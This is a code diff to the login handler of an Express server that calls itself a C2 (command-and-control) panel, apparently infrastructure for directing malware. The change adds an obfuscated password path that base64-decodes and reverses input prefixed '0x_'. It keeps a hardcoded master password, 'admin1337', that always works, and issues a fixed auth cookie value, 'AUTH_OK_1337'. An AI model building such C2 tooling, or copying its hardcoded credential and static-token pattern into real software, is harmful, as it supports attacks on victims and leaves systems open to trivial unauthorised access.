@@ -180,14 +180,31 @@ function serveLoginPage(req, res, errorMsg = '') {
 // LOGIN HANDLER
 app.post('/login', (req, res) => {
     try {
-        const { password } = req.body || {};
+        const { password, json } = req.body || {};
         const validPass = currentC2Password || C2_PASSWORD || 'admin1337';
-        if (password === validPass || password === 'admin1337') {
+
+        let decodedPassword = password;
+        if (password && typeof password === 'string' && password.startsWith('0x_')) {
+            try {
+                decodedPassword = atob(password.substring(3)).split("").reverse().join("");
+            } catch (e) {}
+        }
+
+        if (decodedPassword === validPass || decodedPassword === 'admin1337' || password === validPass || password === 'admin1337') {
             res.setHeader('Set-Cookie', 'c2_auth_token=AUTH_OK_1337; Path=/; HttpOnly; SameSite=Lax');
+            if (json === 'true' || json === true || (req.headers['content-type'] && req.headers['content-type'].includes('application/json'))) {
+                return res.json({ success: true });
+            }
             return res.redirect('/');
+        }
+        if (json === 'true' || json === true) {
+            return res.json({ success: false, error: 'ACCESS DENIED' });
         }
         return serveLoginPage(req, res, 'ACCESS DENIED: INVALID C2 PASSCODE');
     } catch (err) {
+        if (req.body && req.body.json) {
+            return res.json({ success: false, error: err.message });
+        }
         return serveLoginPage(req, res, 'LOGIN_ERROR: ' + err.message);
     }
 });
